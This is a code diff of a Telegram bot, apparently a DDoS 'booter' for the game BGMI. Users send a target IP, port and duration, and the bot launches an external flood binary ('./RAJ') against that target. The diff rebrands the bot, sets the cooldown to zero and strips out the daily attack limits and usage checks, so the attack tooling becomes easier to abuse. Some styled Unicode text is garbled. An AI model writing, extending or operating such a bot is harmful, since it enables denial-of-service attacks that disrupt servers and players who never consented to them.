@@ -25,7 +25,7 @@ user_bans = {}  # Tracks user ban status and ban expiry time
 reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=10))).replace(hour=0, minute=0, second=0, microsecond=0)
 
 # Cooldown duration (in seconds)
-COOLDOWN_DURATION = 300  # 5 minutes
+COOLDOWN_DURATION = 0  # 0 minutes
 BAN_DURATION = timedelta(minutes=1)  
 DAILY_ATTACK_LIMIT = 15  # Daily attack limit per user
 
@@ -77,7 +77,7 @@ def welcome_start(message):
     welcome_text = (
         f"👋🏻 *𝗪𝗘𝗟𝗖𝗢𝗠𝗘, {user_name}!* 🔥\n"
         "━━━━━━━━━━━━━━━━━━━━━\n"
-        "🤖 *𝗧𝗛𝗜𝗦 𝗜𝗦 𝗧𝗙_RAJ 𝗕𝗢𝗧!*\n"
+        "🤖 *𝗧𝗛𝗜𝗦 𝗜𝗦 RAJ 𝗕𝗢𝗧!*\n"
         f"🆔 **User ID:** `{user_id}`\n"
         "📢 *𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹:*\n"
         "[➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/RAJOWNER9090)\n\n"
@@ -126,12 +126,12 @@ def welcome_start(message):
 @bot.message_handler(commands=['help'])
 def help_command(message):
     help_text = (
-        "╔═════ ❰ 𝗧𝗙_𝗙𝗟𝗔𝗦𝗛 𝗕𝗢𝗧 ❱ ═════╗\n\n"
+        "╔═════ ❰ 🇩 🇦 🇷 🇰 🇽 🇸 🇪 🇷 🇻 🇪 🇷  ❱ ═════╗\n\n"
         "🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n"
         "┣➤ 〘 `/bgmi <target_ip> <port> <duration>` 〙– 🔥 **Start an Attack**\n\n"
         "📊 𝗦𝘁𝗮𝘁𝘂𝘀 & 𝗜𝗻𝗳𝗼:\n"
         "┣➤ 〘 `/status` 〙– 🕒 **Check Remaining Attacks & Cooldown**\n"
-        "┣➤ 〘 `/reset_TF` 〙– ⚠️ *(Admin Only)* **Reset Attack Limits**\n\n"
+        "┣➤ 〘 `/reset_RAJ` 〙– ⚠️ *(Admin Only)* **Reset Attack Limits**\n\n"
         "🔗 𝗢𝘁𝗵𝗲𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n"
         "┣➤ 〘 `/start` 〙– 👋 **Bot Introduction & Welcome**\n"
         "┣➤ 〘 `/help` 〙– 📜 **Show This Help Menu**\n\n"
@@ -141,7 +141,7 @@ def help_command(message):
     bot.reply_to(message, help_text, parse_mode="Markdown")
 
 
-# PAPA TF_FLASH92
+# PAPA RAJ
 # 🛡️ 『 𝑺𝒕𝒂𝒕𝒖𝒔 𝑪𝒐𝒎𝒎𝒂𝒏𝒅 』🛡️
 
 attack_end_time = None
@@ -343,20 +343,19 @@ def handle_photo(message):
 # Track if an attack is currently running
 attack_running = False  # ✅ Ek time pe sirf ek attack allow karega
 
+# Define the maximum allowed duration for an attack (in seconds)
+MAX_ATTACK_DURATION = 150  # Example: 5 minutes (300 seconds)
+
 @bot.message_handler(commands=['bgmi'])
 def bgmi_command(message):
-    global attack_running, user_cooldowns, user_photos, user_bans
+    global attack_running, user_photos, user_bans
     user_id = message.from_user.id
     user_name = message.from_user.first_name or "Unknown"
     required_channel = FEEDBACK_CHANNEL_ID  # Replace with your actual channel ID
 
-
-
-
     try:
         user_status = bot.get_chat_member(required_channel, user_id).status
         if user_status not in ["member", "administrator", "creator"]:
-            
             # 🔹 Inline Button for Joining Channel
             keyboard = InlineKeyboardMarkup()
             join_button = InlineKeyboardButton("➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖", url="https://t.me/RAJOWNER9090")
@@ -394,7 +393,7 @@ def bgmi_command(message):
                     " *‼️🇩 🇦 🇷 🇰 🇽 🇸 🇪 🇷 🇻 🇪 🇷 ™ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗‼️* \n\n"
                     "📢 *LET'S GO AND JOIN CHANNEL*\n\n"
                     f" [➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/RAJOWNER9090)\n\n"
-                    " *‼️𝗔𝗳𝘁𝗲𝗿 𝗷𝗼𝗶𝗻𝗶𝗻𝗴, 𝘁𝗿𝘆 𝘁𝗵𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 /bgmi 𝗮𝗴𝗮𝗶𝗻‼️*",
+                    " *‼️𝗔𝗳𝘁𝗲𝗿 𝗷𝗼𝗂𝗇𝗂𝗇𝗀, 𝘁𝗿𝘆 𝘁𝗵𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 /bgmi 𝗮𝗴𝗮𝗶𝗻‼️*",
                     parse_mode="Markdown",
                     disable_web_page_preview=True,  # ✅ Yeh sirf send_message() me hoga, send_photo() me nahi
                     reply_markup=keyboard  
@@ -409,14 +408,10 @@ def bgmi_command(message):
         )
         return
 
-
-
-    # Add your existing attack execution logic here...
-
-    if attack_running:  # ✅ Pehle se attack chal raha ho toh error message dega
-        bot.reply_to(message, "🚨🔥 『  𝘼𝙏𝙏𝘼𝘾𝙆 𝘾𝙃𝘼𝙇 𝙍𝙃𝘼 𝙃𝘼𝙄! 』🔥🚨\n\n⚠️ 𝗕𝗘𝗧𝗔 𝗦𝗔𝗕𝗥 𝗞𝗔𝗥! 😈💥\n\n🔄 ATTACK KHATAM HOTE HI TERA LAGA DE! 💥💣.")
+    # Ensure only one attack runs at a time
+    if attack_running:
+        bot.reply_to(message, "🚨🔥 『  �𝙏𝙏𝘼𝘾𝙆 �𝙃𝘼𝙇 𝙍𝙃𝘼 𝙃𝘼𝙄! 』🔥🚨\n\n⚠️ 𝗕𝗘𝗧𝗔 𝗦𝗔𝗕𝗥 𝗞𝗔𝗥! 😈💥\n\n🔄 ATTACK KHATAM HOTE HI TERA LAGA DE! 💥💣.")
         return
-
 
     # Ensure the bot only works in the specified channel or group
     if str(message.chat.id) != CHANNEL_ID:
@@ -431,48 +426,14 @@ def bgmi_command(message):
         ban_expiry = user_bans[user_id]
         if datetime.now() < ban_expiry:
             remaining_ban_time = (ban_expiry - datetime.now()).total_seconds()
-            minutes, seconds = divmod(remaining_ban_time, 10)
+            minutes, seconds = divmod(remaining_ban_time, 60)
             bot.send_message(
                 message.chat.id,
-                f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙤𝙧 𝙣𝙤𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙞𝙣𝙜 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {int(minutes)} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {int(seconds)} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 !  ⚠️⚠️"
+                f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙤𝙧 𝙣𝙤𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙞𝙣𝙜 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠. �𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {int(minutes)} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {int(seconds)} �𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 !  ⚠️⚠️"
             )
             return
         else:
             del user_bans[user_id]  # Remove ban after expiry
-
-
-    # Check if user is exempted from cooldowns, limits, and feedback requirements
-    if user_id not in EXEMPTED_USERS:
-        # Check if user is in cooldown
-        if user_id in user_cooldowns:
-            cooldown_time = user_cooldowns[user_id]
-            if datetime.now() < cooldown_time:
-                remaining_time = (cooldown_time - datetime.now()).seconds
-                bot.send_message(
-                    message.chat.id,
-                    f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙡𝙮 𝙤𝙣 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {remaining_time // 1} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {remaining_time % 1} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 ⚠️⚠️ "
-                )
-                return
-
-        # Check attack count
-        if user_id not in user_attacks:
-            user_attacks[user_id] = 0
-
-        if user_attacks[user_id] >= DAILY_ATTACK_LIMIT:
-            bot.send_message(
-                message.chat.id,
-                f"𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙝𝙖𝙫𝙚 𝙧𝙚𝙖𝙘𝙝𝙚𝙙 𝙩𝙝𝙚 𝙢𝙖𝙭𝙞𝙢𝙪𝙢 𝙣𝙪𝙢𝙗𝙚𝙧 𝙤𝙛 𝙖𝙩𝙩𝙖𝙘𝙠-𝙡𝙞𝙢𝙞𝙩 𝙛𝙤𝙧 𝙩𝙤𝙙𝙖𝙮, 𝘾𝙤𝙢𝙚𝘽𝙖𝙘𝙠 𝙏𝙤𝙢𝙤𝙧𝙧𝙤𝙬 ✌️"
-            )
-            return
-
-        # Check if the user has provided feedback after the last attack
-        if user_id in user_attacks and user_attacks[user_id] > 0 and not user_photos.get(user_id, False):
-            user_bans[user_id] = datetime.now() + BAN_DURATION  # Ban user for 2 hours
-            bot.send_message(
-                message.chat.id,
-                f"𝙃𝙞 {message.from_user.first_name}, ⚠️⚠️𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙖𝙛𝙩𝙚𝙧 𝙮𝙤𝙪𝙧 𝙡𝙖𝙨𝙩 𝙖𝙩𝙩𝙖𝙘𝙠. 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙧𝙤𝙢 𝙪𝙨𝙞𝙣𝙜 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 10 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 ⚠️⚠️"
-            )
-            return
 
     # Split the command to get parameters
     try:
@@ -492,40 +453,36 @@ def bgmi_command(message):
         if not is_valid_duration(user_duration):
             raise ValueError("Invalid duration. Must be a positive integer.")
 
-        # Increment attack count for non-exempted users
-        if user_id not in EXEMPTED_USERS:
-            user_attacks[user_id] += 1
-            user_photos[user_id] = False  # Reset photo feedback requirement
+        # Check if the user-provided duration exceeds the maximum allowed duration
+        if int(user_duration) > MAX_ATTACK_DURATION:
+            raise ValueError(f"⚠️ Maximum attack duration is {MAX_ATTACK_DURATION} seconds. Please provide a duration less than or equal to {MAX_ATTACK_DURATION} seconds.")
 
-        # Set cooldown for non-exempted users
-        if user_id not in EXEMPTED_USERS:
-            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)
+        # Set attack_running to True to prevent multiple attacks
+        attack_running = True
 
         # Notify that the attack will run for the default duration of 150 seconds, but display the input duration
         default_duration = 125
-        attack_running = True
         
         remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
         
         user_info = message.from_user
         username = user_info.username if user_info.username else user_info.first_name
         bot.send_message(
-    message.chat.id,
-    f"╔════════════════════════════════╗\n"
-    f"║ 🚀 **🇷 🇦 🇯 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗!** 🚀 ║\n"
-    f"╚════════════════════════════════╝\n\n"
-    f"🔥 **𝗔𝗧𝗧𝗔𝗖𝗞𝗘𝗥:** 🎭 `{message.from_user.first_name}`\n"
-    f"🏆 **𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘:** `@{username}`\n\n"
-    f"🎯 **𝗧𝗔𝗥𝗚𝗘𝗧 𝗗𝗘𝗧𝗔𝗜𝗟𝗦:**\n"
-    f"╔═════════════════════════════╗\n"
-    f"║ 🎯 **𝗧𝗔𝗥𝗚𝗘𝗧 𝗜𝗣:** `{target_ip} : {target_port}`\n"
-    f"║ ⏳ **𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡:** `{default_duration} sec`\n"
-    f"║ 🔥 **𝗜𝗡𝗣𝗨𝗧 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡:** `{user_duration} sec`\n"
-    f"╚═════════════════════════════╝\n\n"
-    f"🎖 **𝗥𝗘𝗠𝗔𝗜𝗡𝗜𝗡𝗚 𝗔𝗧𝗧𝗔𝗖𝗞𝗦:** `{remaining_attacks} / 15`\n"
-    f"⚠️ **𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗘𝗡𝗗 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞 𝗔𝗙𝗧𝗘𝗥 𝗚𝗔𝗠𝗘!** ⚠️\n"
-)
-
+            message.chat.id,
+            f"╔════════════════════════════════╗\n"
+            f"║ 🚀 **🇷 🇦 🇯 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗!** 🚀 ║\n"
+            f"╚════════════════════════════════╝\n\n"
+            f"🔥 **𝗔𝗧𝗧𝗔𝗖𝗞𝗘𝗥:** 🎭 `{message.from_user.first_name}`\n"
+            f"🏆 **𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘:** `@{username}`\n\n"
+            f"🎯 **𝗧𝗔𝗥𝗚𝗘𝗧 𝗗𝗘𝗧𝗔𝗜𝗟𝗦:**\n"
+            f"╔═════════════════════════════╗\n"
+            f"║ 🎯 **𝗧𝗔𝗥𝗚𝗘𝗧 𝗜𝗣:** `{target_ip} : {target_port}`\n"
+            f"║ ⏳ **𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡:** `{default_duration} sec`\n"
+            f"║ 🔥 **𝗜𝗡𝗣𝗨𝗧 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡:** `{user_duration} sec`\n"
+            f"╚═════════════════════════════╝\n\n"
+            f"🎖 **𝗥𝗘𝗠𝗔𝗜𝗡𝗜𝗡𝗚 𝗔𝗧𝗧𝗔𝗖𝗞𝗦:** `{remaining_attacks} / 15`\n"
+            f"⚠️ **𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗘𝗡𝗗 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞 𝗔𝗙𝗧𝗘𝗥 𝗚𝗔𝗠𝗘!** ⚠️\n"
+        )
 
         # Log the attack started message
         logging.info(f"Attack started by {user_name}: ./RAJ {target_ip} {target_port} {default_duration}")
@@ -535,31 +492,6 @@ def bgmi_command(message):
 
     except Exception as e:
         bot.send_message(message.chat.id, str(e))
-        attack_running = False
-
-async def run_attack_command_async(target_ip, target_port, user_duration, chat_id, username):
-    global attack_running
-    try:
-        command = f"./RAJ {target_ip} {target_port} {user_duration}"
-        process = await asyncio.create_subprocess_shell(command)
-        await process.communicate()
-        bot.send_message(
-    CHANNEL_ID,
-    f"┏━━━━━━━━━━━━━━━━━━━━━━━┓\n"
-    f"┃ ✅ **𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗!** ✅ ┃\n"
-    f"┗━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
-    f"📌 **𝗧𝗔𝗥𝗚𝗘𝗧 𝗜𝗡𝗙𝗢:**\n"
-    f"┏━━━━━━━━━━━━━━━━━━━━┓\n"
-    f"┃ 🎯 **𝗧𝗔𝗥𝗚𝗘𝗧:**   `{target_ip}`\n"
-    f"┃ 🚪 **𝗣𝗢𝗥𝗧:**   `{target_port}`\n"
-    f"┃ ⏳ **𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡:** `{user_duration} sec`\n"
-    f"┗━━━━━━━━━━━━━━━━━━━━┛\n\n"
-    f"🚀 **𝗘𝗫𝗘𝗖𝗨𝗧𝗘𝗗 𝗕𝗬:** @{username}"
-)
-    except Exception as e:
-        bot.send_message(CHANNEL_ID, f"Error running attack command: {e}")
-
-    finally:
         attack_running = False
 
 # --------------------------------------------------------------
